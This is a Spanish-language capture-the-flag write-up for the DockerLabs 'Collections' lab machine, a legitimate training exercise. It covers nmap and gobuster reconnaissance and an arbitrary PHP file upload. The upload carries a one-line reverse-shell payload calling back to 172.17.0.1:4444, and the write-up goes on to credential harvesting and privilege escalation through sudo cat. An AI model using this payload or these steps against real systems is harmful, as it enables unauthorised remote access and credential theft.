---
title: Collections
date: 2025-02-27
categories: [WRITEUPS, DockerLabs]
tags: []  # TAG names should always be lowercase
image: /assets/images/dockerlabs/collect1.png
---

En la máquina **Collections** de **DockerLabs** explotaremos un **Arbitrary File Upload** en el panel del admin, encontraremos las credenciales de un usuario en un archivo que únicamente se puede ejecutar por el usuario **root**, y escalaremos los máximos privilegios mediante los permisos de **sudo** del usuario.

---

En este ***Writeup*** se engloban las siguientes fases:

- **[Reconocimiento](#reconocimiento)**

- **[Explotación](#explotación)**

- **[Escalada de privilegios](#escalada-de-privilegios)**

---

Despliegue de la máquina

![picture](/assets/images/dockerlabs/collect2.png){: w="500" h="200" }

---

## **Reconocimiento**

Lo primero voy a lanzar un escaneo de puertos con `nmap`, para comprobar que puertos tiene abiertos.

```bash
nmap -p- --open --min-rate 5000 172.17.0.2 -n -Pn -oN allports
```

![picture](/assets/images/dockerlabs/collect3.png){: w="500" h="200" }

Voy a lanzar un segundo escaneo para ver las versiones de los servicios, e intentar encontrar algo más de información con los scripts predeterminados de `nmap`.

```bash
nmap -p22,53,80 -sVC 172.17.0.2 -oN targeted
```

Y encontramos en el puerto `53` el servicio `ISC BIND`, que es un software de implementación de servidores `DNS` (Domain Name System).

![picture](/assets/images/dockerlabs/collect4.png){: w="500" h="200" }

Buscando en el navegador para ver el contenido de la web no encuentro nada interesante.

![picture](/assets/images/dockerlabs/collect5.png)

Añado el nombre de la empresa **hackzones.hl** en el archivo `/etc/hosts` .

```bash
172.17.0.2 hackzones.hl
```

Y al introducir el nombre de dominio en el navegador, carga un panel de "**login**".

![picture](/assets/images/dockerlabs/collect6.png)

Realizando **Fuzzing** con la herramienta `Gobuster` sobre la ruta `http://hackzones.hl` encuentro lo siguiente.

```bash
gobuster dir -u http://hackzones.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html,md -b 403,404 --no-error
```

![picture](/assets/images/dockerlabs/collect7.png)

Después de inspeccionar lo encontrado, en la ruta `/dashboard.html` encuentro una panel del usuario **admin**, en el cual probando a subir un archivo con extensión `php` en la imagen del usuario, ha dado resultado y se ha acabado subiendo en la ruta `uploads`.

![picture](/assets/images/dockerlabs/collect8.png)

![picture](/assets/images/dockerlabs/collect9.png){: w="500" h="200" }

---
## **Explotación**

A continuación, la idea es subir un archivo con el código `php` para obtener una **Reverse Shell**.

- Archivo `shell.php`
	
	```php
	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"); ?>
	```

Lo subimos, y comprobamos que se encuentra en el directorio `/uploads`.

![picture](/assets/images/dockerlabs/collect10.png){: w="500" h="200" }

Antes de ejecutarlo necesitamos abrir un puerto mediante un **Listener** con `ncat` para poder enviarnos la **Reverse Shell** a nuestra máquina local.

- Listener
	
	```bash
	nc -lnvp 4444
	```

Ejecutamos el archivo `shell.php` desde el navegador y obtenemos acceso al servidor como el usuario `www-data`.

![picture](/assets/images/dockerlabs/collect11.png){: w="500" h="200" }

Realizo un tratamiento de la **TTY**, para tener una mejor interacción con la terminal.

```bash
script /dev/null -c bash
Ctrl + Z
export TERM=xterm
export SHELL=/bin/bash
stty rows 48 columns 188
reset
```

En el archivo `/authenticate.php` encuentro las credenciales del panel de "**login**" encontrado anteriormente.

![picture](/assets/images/dockerlabs/collect12.png){: w="500" h="200" }

Listando el contenido del archivo `/etc/passwd` filtrando por `bash`, para ver los usuarios que tienen asignados una `shell` de tipo `bash`, únicamente encuentro el usuario privilegiado `root`, y el usuario `mrrobot`.

![picture](/assets/images/dockerlabs/collect13.png){: w="500" h="200" }

---
## **Escalada de privilegios**

Buscando por las carpetas de la máquina, encuentro un archivo `secret.sh`, viendo su contenido me doy cuenta que es un script en **Bash** que verifica si se está ejecutando como **root** y luego construye y muestra una cadena de texto basada en caracteres codificados en **hexadecimal**.

![picture](/assets/images/dockerlabs/collect14.png){: w="500" h="200" }

La idea es llevarlo a mi máquina local para ejecutarlo como **root** y ver que me muestra.

Lo ejecuto como **root**, y parece sacar una contraseña como output.

![picture](/assets/images/dockerlabs/collect15.png){: w="500" h="200" }

Intentamos acceder vía `ssh` como el usuario **mrrobot**, y obtenemos acceso.

![picture](/assets/images/dockerlabs/collect16.png)

En el directorio `/opt` encuentro un archivo, el cual no puedo leer.

![picture](/assets/images/dockerlabs/collect17.png)

Listamos los permisos de `sudo` del usuario y el usuario tiene la capacidad de ejecutar `cat`  como super usuario.

![picture](/assets/images/dockerlabs/collect18.png)

Viendo el contenido del archivo, encuentro la contraseña del usuario **root**.

![picture](/assets/images/dockerlabs/collect19.png)

![picture](/assets/images/dockerlabs/collect20.png)